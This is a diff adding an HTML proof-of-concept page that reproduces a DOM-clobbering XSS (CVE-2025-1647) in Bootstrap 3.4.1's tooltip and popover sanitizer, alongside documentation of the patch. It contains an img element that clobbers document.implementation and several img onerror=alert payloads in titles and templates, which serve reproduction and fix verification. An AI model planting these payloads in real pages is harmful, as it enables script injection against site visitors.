@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC: SNYK-JS-BOOTSTRAP-10176066 / CVE-2025-1647 - XSS via DOM Clobbering</title>
+    <link rel="stylesheet" href="../dist/css/@pa-nihr-crn/bootstrap-3.4.1-patched.min.css">
+    <script src="../js/tests/vendor/jquery.min.js"></script>
+    <script src="../dist/js/@pa-nihr-crn/bootstrap-3.4.1-patched.min.js"></script>
+</head>
+
+<body>
+    <div class="container">
+        <h1>
+            <small>Reproduction of Bootstrap Vulnerability:</small><br />
+            Cross-site Scripting (XSS) using DOM Clobbering during HTML sanitization
+        </h1>
+
+        <section class="vulnerability-info-section">
+            <h2>Vulnerability information</h2>
+            <table class="vulnerability-info-table">
+                <tr>
+                    <th>CVE:</th>
+                    <td>CVE-2025-1647</td>
+                </tr>
+                <tr>
+                    <th>Type:</th>
+                    <td><a href="https://owasp.org/www-community/attacks/DOM_Based_XSS">DOM based Cross-site Scripting
+                            (XSS)</a> using <a href="https://domclob.xyz/domc_wiki/index">DOM Clobbering</a></td>
+                </tr>
+                <tr>
+                    <th>Affected version:</th>
+                    <td>3.4.1</td>
+                </tr>
+                <tr>
+                    <th>Fixed in version:</th>
+                    <td><a href="https://www.herodevs.com/support/nes-bootstrap">Bootstrap 3.4.x NES</a> v3.4.7</td>
+                </tr>
+                <tr>
+                    <th>Description:</th>
+                    <td>
+                        DOM-based Cross-site Scripting (XSS) via DOM clobbering occurs when an attacker manipulates the
+                        Document Object Model (DOM) to overwrite or "clobber" an existing DOM object, leading to the
+                        execution of malicious scripts. This technique takes advantage of the browser's handling of DOM
+                        elements and can occur entirely on the client side, bypassing traditional XSS protections on the
+                        server. In this case, there is a function in Bootstrap, <code>sanitizeHtml</code>, that can be
+                        forced to skip the sanitization if the <code>createHTMLDocument</code> method is clobbered.
+                    </td>
+                </tr>
+            </table>
+        </section>
+
+        <section class="repro-instructions-section">
+            <h2>Reproduction instructions</h2>
+
+            <div class="alert alert-warning">
+                <strong>Note:</strong> This page currently uses the patched version of Bootstrap. To recreate the
+                vulnerability and see the XSS attack in action, update the <code>&lt;head&gt;</code> tag includes to
+                reference the original vulnerable Bootstrap 3.4.1 from a CDN:
+                <pre style="margin-top: 10px; background: #f5f5f5; padding: 10px; border-radius: 4px;">&lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/css/bootstrap.min.css"&gt;
+&lt;script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js"&gt;&lt;/script&gt;</pre>
+            </div>
+
+            <div class="alert alert-success">
+                <strong>File Modified:</strong> <code>js/tooltip.js</code> (also affects <code>js/popover.js</code>
+                which inherits from tooltip)
+                <br><br>
+                <strong>Change Applied:</strong> Captured a safe reference to
+                <code>document.implementation.createHTMLDocument</code> at module initialization time, before any DOM
+                clobbering can occur, and modified the <code>sanitizeHtml</code> function to use this stored reference.
+                <br><br>
+                <strong>Location 1:</strong> Line 13-17 (after <code>'use strict'</code>, storing safe reference)
+                <br>
+                <strong>Code Added:</strong>
+                <pre style="margin-top: 10px; background: #f5f5f5; padding: 10px; border-radius: 4px;">// Store safe reference before any DOM clobbering can occur
+var nativeCreateHTMLDocument = document.implementation && 
+                                document.implementation.createHTMLDocument ? 
+                                document.implementation.createHTMLDocument.bind(document.implementation) : 
+                                null</pre>
+                <br>
+                <strong>Location 2:</strong> Line 112-119 (modified <code>sanitizeHtml</code> function)
+                <br>
+                <strong>Code Changed:</strong>
+                <pre style="margin-top: 10px; background: #f5f5f5; padding: 10px; border-radius: 4px;">// BEFORE (vulnerable):
+if (!document.implementation || !document.implementation.createHTMLDocument) {
+  return unsafeHtml
+}
+var createdDocument = document.implementation.createHTMLDocument('sanitization')
+
+// AFTER (patched):
+if (!nativeCreateHTMLDocument) {
+  return ''  // Return empty string instead of unsafeHtml
+}
+var createdDocument = nativeCreateHTMLDocument('sanitization')</pre>
+                <strong>Rationale:</strong> By storing the reference to <code>createHTMLDocument</code> when the module
+                loads (before user HTML is parsed), the code is immune to DOM clobbering attacks that try to override
+                <code>document.implementation</code>. Additionally, returning an empty string instead of unsanitized
+                HTML provides defense-in-depth.
+            </div>
+
+            <b>Steps:</b>
+            <ol>
+                <li>
+                    Hover your mouse over the <code>Template Tooltip</code> button and observe the appearance of an
+                    alert and dismiss it to proceed. This alert represents the potential execution of malicious scripts.
+                    Hovering over the button again will not produce an alert because it is built once and cached so the
+                    <code>onerror</code> event triggers only the first time the template is rendered.
+                </li>
+                <li>
+                    Clicking on the <code>Template Popover</code> button will produce the same result as the
+                    <code>Template Tooltip</code> button.
+                </li>
+                <li>
+                    Hovering over the <code>HTML Tooltip</code> button behaves the same as the template buttons, but
+                    this alert will appear every time because HTML is re-rendered on every interaction causing the
+                    onerror event to fire each time.
+                </li>
+                <li>
+                    The same behavior as the <code>HTML Tooltip</code> button can be seen when clicking on either the
+                    <code>HTML Title Popover</code> or the <code>HTML Data Popover</code> buttons. To see the alert
+                    mutliple times for the popover buttons, they must be clicked twice - once to open the popover and
+                    show the alert and the second to close the popover. The alert must be dismissed each time it
+                    appears.
+                </li>
+            </ol>
+        </section>
+
+        <section class="repro-content-section" ng-app="app">
+            <h2>Reproduction</h2>
+            <img name="implementation" src="clobbered" style="display: none;" />
+
+            <span class="section-header">Template Injection</span>
+            <div class="row">
+                <button type="button" id="template-tooltip" data-toggle="tooltip" data-placement="top"
+                    title="Tooltip on top">Template Tooltip
+                </button>
+            </div>
+
+            <div class="row">
+                <button type="button" id="template-popover" data-toggle="popover" title="Popover Title"
+                    data-content="Some content inside the popover">Template Popover
+                </button>
+            </div>
+
+            <br><br>
+            <span class="section-header">HTML Injection</span>
+            <div class="row">
+                <button type="button" id="html-tooltip" data-toggle="tooltip" data-html="true" data-placement="top"
+                    title="<img src=x onerror=alert('title-tooltip')>">HTML Tooltip
+                </button>
+            </div>
+
+            <div class="row">
+                <button type="button" id="html-title-popover" data-html="true" data-toggle="popover"
+                    title="<img src=x onerror=alert('title-popover')>">HTML Title Popover
+                </button>
+            </div>
+
+            <div class="row">
+                <button type="button" id="html-data-popover" data-html="true" data-toggle="popover"
+                    data-content="<img src=y onerror=alert('data-content-popover')>">HTML Data Popover
+                </button>
+            </div>
+        </section>
+    </div>
+    <script>
+        $(document).ready(function () {
+            $("#html-tooltip").tooltip();
+            $("#template-tooltip").tooltip({
+                template: '<img src=z onerror=alert("template-tooltip")>'
+            });
+
+            $("#html-title-popover").popover();
+            $("#html-data-popover").popover();
+            $("#template-popover").popover({
+                template: '<img src=z onerror=alert("template-popover")>'
+            });
+        });
+    </script>
+</body>
+
+</html>
